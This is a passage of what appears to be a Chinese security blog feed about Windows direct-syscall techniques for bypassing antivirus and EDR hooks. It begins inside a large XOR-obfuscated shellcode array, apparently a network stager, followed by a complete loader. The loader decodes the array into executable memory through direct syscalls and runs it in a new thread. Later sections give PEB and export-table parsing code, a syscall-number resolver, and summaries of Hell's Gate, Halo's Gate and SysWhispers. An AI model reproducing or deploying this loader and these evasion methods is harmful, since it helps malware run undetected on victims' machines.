class="string">&quot;\xbe\x0a\xc1\xa6\xb2\xaa\x8a\x42\x42\x42\x03\x13\x03\x12\x10\x13\x14\x0a\x73\x90\x27\x0a\xc9\x10\x22\x0a\xc9\x10\x5a\x0a\xc9\x10\x62\x0a\xc9\x30\x12\x0a\x4d\xf5\x08\x08\x0f\x73\x8b\x0a\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x03\x83\x8b\x4f\x03\x43\x83\xa0\xaf\x10\x03\x13\x0a\xc9\x10\x62\xc9\x00\x7e\x0a\x43\x92\x24\xc3\x3a\x5a\x49\x40\x37\x30\xc9\xc2\xca\x42\x42\x42\x0a\xc7\x82\x36\x25\x0a\x43\x92\x12\xc9\x0a\x5a\x06\xc9\x02\x62\x0b\x43\x92\xa1\x14\x0a\xbd\x8b\x03\xc9\x76\xca\x0a\x43\x94\x0f\x73\x8b\x0a\x73\x82\xee\x03\x83\x8b\x4f\x03\x43\x83\x7a\xa2\x37\xb3\x0e\x41\x0e\x66\x4a\x07\x7b\x93\x37\x9a\x1a\x06\xc9\x02\x66\x0b\x43\x92\x24\x03\xc9\x4e\x0a\x06\xc9\x02\x5e\x0b\x43\x92\x03\xc9\x46\xca\x0a\x43\x92\x03\x1a\x03\x1a\x1c\x1b\x18\x03\x1a\x03\x1b\x03\x18\x0a\xc1\xae\x62\x03\x10\xbd\xa2\x1a\x03\x1b\x18\x0a\xc9\x50\xab\x0d\xbd\xbd\xbd\x1f\x28\x42\x0b\xfc\x35\x2b\x2c\x2b\x2c\x27\x36\x42\x03\x14\x0b\xcb\xa4\x0e\xcb\xb3\x03\xf8\x0e\x35\x64\x45\xbd\x97\x0a\x73\x8b\x0a\x73\x90\x0f\x73\x82\x0f\x73\x8b\x03\x12\x03\x12\x03\xf8\x78\x14\x3b\xe5\xbd\x97\xa9\x31\x18\x0a\xcb\x83\x03\xfa\x6a\x41\x42\x42\x0f\x73\x8b\x03\x13\x03\x13\x28\x41\x03\x13\x03\xf8\x15\xcb\xdd\x84\xbd\x97\xa9\x1b\x19\x0a\xcb\x83\x0a\x73\x90\x0b\xcb\x9a\x0f\x73\x8b\x10\x2a\x42\x40\x02\xc6\x10\x10\x03\xf8\xa9\x17\x6c\x79\xbd\x97\x0a\xcb\x84\x0a\xc1\x81\x12\x28\x48\x1d\x0a\xcb\xb3\x0a\xcb\x98\x0b\x85\x82\xbd\xbd\xbd\xbd\x0f\x73\x8b\x10\x10\x03\xf8\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc7\xdf\x43\x42\x42\x0a\xbd\x8d\x4d\xc6\xce\x43\x42\x42\xa9\x91\xab\xa6\x43\x42\x42\xaa\xe0\xbd\xbd\xbd\x6d\x28\x08\x11\x14\x42\x2c\xaf\xcb\x27\xf3\xeb\x79\x89\x97\xe9\x9e\x82\x2b\x92\x89\x37\x1b\x18\x0f\xfb\x7f\x6f\x51\xaf\xd2\xe8\x4e\x3e\x46\xfd\xf9\x48\xbb\x8a\x77\x46\xa2\xae\x4b\x48\x90\xed\xd7\x70\xa0\xea\xe8\xff\x56\xcc\x0f\xa1\x60\xf5\x32\x38\xfc\x5f\xa5\x65\x08\xd6\x8d\x3c\x2e\x6d\xad\x5d\x3f\xa4\xe2\x00\x8a\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x62\x0e\x00\x00\x10\x0d\x15\x11\x07\x10\x4f\x48\x42\x9a\xd8\x83\x80\x12\x4c\x94\x3e\x35\x26\x4a\xb4\x1b\x66\xd3\xf9\xcf\x15\x15\xb4\xef\x52\x8c\x9a\x93\x5d\xad\x04\x25\x97\x2d\xb4\xf4\x6b\xd4\x1e\xd0\x29\xd2\xfa\xfe\x7f\xf3\x29\xa5\x7e\x27\x1b\x09\x81\x60\x12\x17\x47\xf4\xe0\x34\x4c\xd6\x63\x50\xd5\x79\x95\x32\xbe\x75\x69\x28\x15\x36\x6a\xcf\xf8\xbe\x39\x5b\x9e\x23\x43\xce\xc1\x27\x85\x92\x80\x15\x54\x82\x47\x51\x33\x6e\x1a\x06\x6a\x59\xd3\xc5\xf4\xaa\x46\xed\xf7\x03\x57\x17\x93\xab\x39\xb4\xb2\xed\x09\x74\xb1\x25\x22\x32\xbb\xd2\x64\xee\xc9\x94\xb1\x31\x63\x57\x71\xe2\x44\x19\x71\x61\x5a\x72\x3d\xe9\x90\xd1\x7e\x81\x87\xf0\xe4\x8c\xe1\x0f\x57\xc4\xe2\xeb\x7b\x89\x64\x66\x34\x5a\x0b\xba\xc2\x9b\x3e\x4c\xc8\xfd\x8e\x31\xcc\xe9\x63\x04\x4c\x94\x15\xea\x63\xc6\xcd\x4c\xfa\xa1\xa4\x9c\x34\x86\x87\x1f\xe8\x37\x1c\x3e\xf8\xac\xac\xdd\x88\xc2\x73\xa2\x3b\x25\x3b\x81\x77\x18\x04\x8f\x97\xc2\x3b\xdf\x86\x89\x42\x03\xfc\xb2\xf7\xe0\x14\xbd\x97\x0a\x73\x8b\xf8\x42\x42\x02\x42\x03\xfa\x42\x52\x42\x42\x03\xfb\x02\x42\x42\x42\x03\xf8\x1a\xe6\x11\xa7\xbd\x97\x0a\xd1\x11\x11\x0a\xcb\xa5\x0a\xcb\xb3\x0a\xcb\x98\x03\xfa\x42\x62\x42\x42\x0b\xcb\xbb\x03\xf8\x50\xd4\xcb\xa0\xbd\x97\x0a\xc1\x86\x62\xc7\x82\x36\xf4\x24\xc9\x45\x0a\x43\x81\xc7\x82\x37\x95\x1a\x1a\x1a\x0a\x47\x42\x42\x42\x42\x12\x81\xaa\xdd\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x71\x70\x42\x78\x9c\x2a\xf3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	  </span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtAllocateVirtualMemoryEx&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtAllocateVirtualMemoryExProc,FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)&amp;NtAllocateVirtualMemoryExProc;</span><br><span class="line">	</span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtWriteVirtualMemoryProc, FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)&amp;NtWriteVirtualMemoryProc;</span><br><span class="line">	</span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtCreateThreadExProc, FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)&amp;NtCreateThreadExProc;</span><br><span class="line">	</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//返回非0</span></span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 还原异或</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">66</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	status = NtWriteVirtualMemory(hProcess, Address, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)Address, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="通过dll导出表的方式获取函数名称及地址"><a href="#通过dll导出表的方式获取函数名称及地址" class="headerlink" title="通过dll导出表的方式获取函数名称及地址"></a>通过dll导出表的方式获取函数名称及地址</h5><p>流程:</p>
<ul>
<li><ol>
<li>找到模块基地址</li>
</ol>
</li>
<li><ol start="2">
<li>获取 IMAGE_DOS_HEADER  </li>
</ol>
</li>
<li><ol start="3">
<li>遍历 IMAGE_NT_HEADER IMAGE_FILE_HEADER IMAGE_OPTIONAL_HEADER</li>
</ol>
</li>
<li><ol start="4">
<li>在 IMAGE_OPTIONAL_HEADER找到导出表地址 在IMAGE_DATA_DIRECTORY中 随后即可得到ntdll的导出函数及函数地址</li>
</ol>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetPeHeader</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    PBYTE ImageBase;</span><br><span class="line">    PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PLDR_MODULE pLoadModule;</span><br><span class="line">    <span class="comment">// NTDLL</span></span><br><span class="line">    pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">    ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line"></span><br><span class="line">    Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    <span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">    File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line">    Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">    ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNames);</span><br><span class="line">    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt; AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; ExportTable-&gt;NumberOfNames; cx++) </span><br><span class="line">    &#123;</span><br><span class="line">        PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);</span><br><span class="line">        PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Syscall项目"><a href="#Syscall项目" class="headerlink" title="Syscall项目"></a>Syscall项目</h4><h5 id="Hell’s-Gate-地狱之门"><a href="#Hell’s-Gate-地狱之门" class="headerlink" title="Hell’s Gate  地狱之门"></a>Hell’s Gate  地狱之门</h5><p><a href="https://github.com/am0nsec/HellsGate/">https://github.com/am0nsec/HellsGate/</a> </p>
<p>对于源码分析可以参考这位师傅的<a href="http://moonflower.fun/index.php/2022/10/31/339/">http://moonflower.fun/index.php/2022/10/31/339/</a></p>
<p>原理:在PEB结构中解析InMemoryOrderModuleLIst 找到Ntdll.dll地址 解析结构后再遍历导出表 根据函数名的hash找到函数地址 再通过0xb8这个操作码去动态获取对应的系统调用号 </p>
<p>但是如果ntdll被修改或者被hook 找不到0xb8这个操作码 那么该方法就没用了.</p>
<p><img src="/posts/b3138fd/9.png" alt="img"></p>
<h5 id="Halo’s-Gate-光环之门"><a href="#Halo’s-Gate-光环之门" class="headerlink" title="Halo’s Gate 光环之门"></a>Halo’s Gate 光环之门</h5><p><a href="https://github.com/boku7/AsmHalosGate">https://github.com/boku7/AsmHalosGate</a></p>
<p>地狱之门实现了动态的系统调用(4cb18d4b),但是也有局限:ntdll.dll必须默认是自己的 如果ntdll被修改过或者被hook过(汇编操作码不再是0xb8) ，那么就无法动态获取他的系统调用号(SSN)，这便出现了光环之门。</p>
<p>原理: EDR不会hook住所有的NT函数，总会有不敏感的函数没有被hook ，所以可以上下循环遍历（32字节）、递归，找到没有被hook的邻函数，  然后获取系统调用号再去减去移动的步数，最终得到所要搜索的系统调用号。</p>
<p>主要还是根据syscall的特征字节码4C 8B D1 B8</p>
<h5 id="Tartarus-Gate"><a href="#Tartarus-Gate" class="headerlink" title="Tartarus Gate"></a>Tartarus Gate</h5><p><a href="https://github.com/trickster0/TartarusGate">https://github.com/trickster0/TartarusGate</a></p>
<p><a href="https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/">https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/</a> </p>
<p>光环之门的加强 只检测第一个字节和第四个字节是否是0xe9来判断函数是否被hook</p>
<p><img src="/posts/b3138fd/10.png" alt="img"></p>
<h5 id="Spoofing-Gate-欺骗之门"><a href="#Spoofing-Gate-欺骗之门" class="headerlink" title="Spoofing-Gate 欺骗之门"></a>Spoofing-Gate 欺骗之门</h5><p><a href="https://github.com/timwhitez/Spoofing-Gate">https://github.com/timwhitez/Spoofing-Gate</a></p>
<p>由于是go写的项目 看不懂代码。。o(╥﹏╥)o 直接贴图🍊神的了</p>
<p><img src="/posts/b3138fd/10-1.png" alt="img"></p>
<h5 id="ParallerSyscalls"><a href="#ParallerSyscalls" class="headerlink" title="ParallerSyscalls"></a>ParallerSyscalls</h5><p><a href="https://github.com/mdsecactivebreach/ParallelSyscalls">https://github.com/mdsecactivebreach/ParallelSyscalls</a></p>
<p><a href="https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/">https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/</a></p>
<p>使用Syscall 从磁盘中读取ntdll，最后利用LdrpThunkSignature 回复系统调用。同时实现了 dll 的并行加载，过程中运行进程递归映射通过进程模块导入表导入 dll 的过程。</p>
<h5 id="SysWishpers2"><a href="#SysWishpers2" class="headerlink" title="SysWishpers2"></a>SysWishpers2</h5><p><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p>
<p>python3 syswhispers.py -a x64  -o syscall -l masm -f NtCreateThreadEx</p>
<p><img src="/posts/b3138fd/11.png" alt="img"></p>
<p>在syscall.c中 主要用到了两个函数 SW2_PopulateSyscallList  SW2_GetSyscallNumber</p>
<p>SW2_PopulateSyscallList</p>
<p>通过PEB已加载ntdll中的内存机制</p>
<p><img src="/posts/b3138fd/12.png" alt="img"></p>
<p>遍历内存中ntdll的导出表 获取zw开头的函数名 并存到Entries中</p>
<p><img src="/posts/b3138fd/13.png" alt="img"></p>
<p>对该全局数组进行冒泡升序排序</p>
<p><img src="/posts/b3138fd/14.png" alt="img"></p>
<p>SW2_GetSyscallNumber</p>
<p>后者先遍历SW2_PopulateSyscallList函数中的数组，如果Hash相等就返回循环的值(SSN)</p>
<p><img src="/posts/b3138fd/15.png" alt="img"></p>
<h5 id="SysWishpers3"><a href="#SysWishpers3" class="headerlink" title="SysWishpers3"></a>SysWishpers3</h5><p><a href="https://github.com/klezVirus/SysWhispers3">https://github.com/klezVirus/SysWhispers3</a></p>
<p><img src="/posts/b3138fd/16.png" alt="img"></p>
<p>SW3_GetRandomSyscallAddress 函数的主要作用是得到一个随机的 Native API 的syscall 指令地址，其余部分大都相同。</p>
<p>对比下这两个版本生成的masm文件，左图为2代，右图为3代</p>
<p><img src="/posts/b3138fd/17.png" alt="img"></p>
<p>在3代的汇编代码中隐藏了2代中的syscall ret  ，而是先将保存syscall的地址 并随机获取其他 API stubs 中的 syscall 指令 最后通过jmp的方式跳转到syscall地址，从而绕过对部分edr对syscall指令的标记。(即从内存中动态找出替换syscall)</p>
<p>EDR不仅会检测Syscall的字符，还会检查syscall执行指定指令的位置。</p>
<p>API调用Syscall的正常流程图如下:</p>
<p><img src="/posts/b3138fd/18.png" alt="img"></p>
<p>而当使用SysWhispers调用函数时，syscall指令会直接在程序的主模块执行 如下所示</p>
<p><img src="/posts/b3138fd/19.png" alt="img"></p>
<h5 id="GetSSN"><a href="#GetSSN" class="headerlink" title="GetSSN"></a>GetSSN</h5><p>领一种发先SYscall Number的方法，不需要unhook、不需要从代码根存中读取，也不需要加载Ntdll副本</p>
<p>可以将它理解为光环之门的延伸   如果上下邻函数都被hook了 光环之门还会继续递归，不断寻找没有被hook的邻函数，而最坏的结构就是所有的函数(NT*)都被hook了，那么最后将会向上递归到SSN=0的NT函数。</p>
<p>首先需要了解:</p>
<ol>
<li>所有的Nt函数和Zw同名函数实际上是等价的</li>
<li>Nt函数的系统调用号实际上是和Zw函数按照地址顺序的排列也是一样的</li>
</ol>
<p><img src="/posts/b3138fd/20.png" alt="img"></p>
<p>因此 我们只需要遍历所有Zw函数，记录其函数名和函数地址，最后安装函数地址升序排列后，每个函数的SSN就是对应的排列顺序</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;peb.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetSSN</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::map&lt;<span class="type">int</span>, string&gt; Nt_Table;</span><br><span class="line">	PBYTE ImageBase;</span><br><span class="line">	PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//64位的PEB指针</span></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	PLDR_MODULE pLoadModule;</span><br><span class="line">	<span class="comment">// NTDLL</span></span><br><span class="line">	pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">	ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line"></span><br><span class="line">	Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">	File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="built_in">sizeof</span>(DWORD)));</span><br><span class="line">	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="built_in">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">	ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line">	</span><br><span class="line">	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNames);</span><br><span class="line">	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line">	<span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; ExportTable-&gt;NumberOfNames; cx++)</span><br><span class="line">	&#123;</span><br><span class="line">		PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);</span><br><span class="line">		PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="type">char</span>*)pczFunctionName, <span class="string">&quot;Zw&quot;</span>, <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">			Nt_Table[(<span class="type">int</span>)pFunctionAddress] = (string)pczFunctionName;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (std::map&lt;<span class="type">int</span>, string&gt;::iterator iter = Nt_Table.<span class="built_in">begin</span>(); iter != Nt_Table.<span class="built_in">end</span>(); ++iter) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;index:&quot;</span> &lt;&lt; index &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">		index += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">GetSSN</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b3138fd/21.png" alt="img"></p>
<h5 id="HWSyscalls-后续完善"><a href="#HWSyscalls-后续完善" class="headerlink" title="HWSyscalls(后续完善)"></a>HWSyscalls(后续完善)</h5><p><a href="https://github.com/Dec0ne/HWSyscalls/">https://github.com/Dec0ne/HWSyscalls/</a></p>
<p>今日逛reddit无意间发现的新项目，HWSyscalls是一种使用HWBP、HalosGate和带有HWBP的kernel32上的合成跳板执行间接syscalls的新方法</p>
<p>  后续有时间的话再看下</p>
<h4 id="Syscall检测（后续完善）"><a href="#Syscall检测（后续完善）" class="headerlink" title="Syscall检测（后续完善）"></a>Syscall检测（后续完善）</h4><p><a href="https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</a></p>
<p>在ntdll.dll中的系统调用一般都会遵循结构代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r10, rcx</span><br><span class="line">mov eax, 「Syscall Number」</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>frida没接触过 后面研究下</p>
<h4 id="Referernces"><a href="#Referernces" class="headerlink" title="Referernces"></a>Referernces</h4><p><a href="https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav">https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav</a></p>
<p><a href="https://myzxcg.com/2022/01/Windows-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2022/01/Windows-系统调用分析与免杀实现/</a></p>
<p><a href="http://moonflower.fun/index.php/2022/10/31/339/">http://moonflower.fun/index.php/2022/10/31/339/</a></p>
<p><a href="https://bbs.pediy.com/thread-223023.htm">https://bbs.pediy.com/thread-223023.htm</a></p>
<p><a href="https://idiotc4t.com/defense-evasion/dynamic-get-syscallid">https://idiotc4t.com/defense-evasion/dynamic-get-syscallid</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1470904">https://cloud.tencent.com/developer/article/1470904</a></p>
<p><a href="https://tttang.com/archive/1464/">https://tttang.com/archive/1464/</a></p>
<p><a href="https://forum.butian.net/share/1014">https://forum.butian.net/share/1014</a></p>
<p><a href="https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/">https://trickster0.github.io/posts/Halo&#39;s-Gate-Evolves-to-Tartarus-Gate/</a></p>
<p><a href="https://www.ctfiot.com/84964.html">https://www.ctfiot.com/84964.html</a></p>
]]></content>
      <categories>
        <category>Syscall</category>
      </categories>
      <tags>
        <tag>Syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>进程自创建</title>
    <url>/posts/e5191117/</url>
    <content><![CDATA[<p>通过父进程创建一个同名的子进程（进程的自创建）</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>1、获取父进程的模块路径<br>2、父进程以挂起状态创建子进程（需要注意，因为是父进程实现自我创建，也就是说父进程创建的进程也是他自己，所以当父进程以挂起状态创建子进程的时候，父进程此时本身也是处于挂起状态的）<br>3、获取此时父进程的进程上下文来当作子进程的上下文<br>4、设置子进程上下文的Eip/RIp(x64)<br>5、恢复现场(设置上下文，恢复线程)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ChildProcess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;子进程创建成功&quot;</span>, <span class="string">&quot;子进程创建成功&quot;</span>, MB_OK);</span><br><span class="line">	Sleep(<span class="number">3000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is child process&quot;</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(STARTUPINFO), &#125;;<span class="comment">//STARTUPINFO的第一个元素必须初始化为该结构体的大小</span></span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	CONTEXT ctx = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is Father Process!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.获取父进程模块</span></span><br><span class="line">	<span class="keyword">if</span> (!GetModuleFileName(<span class="literal">NULL</span>, szPath, <span class="keyword">sizeof</span>(TCHAR) * 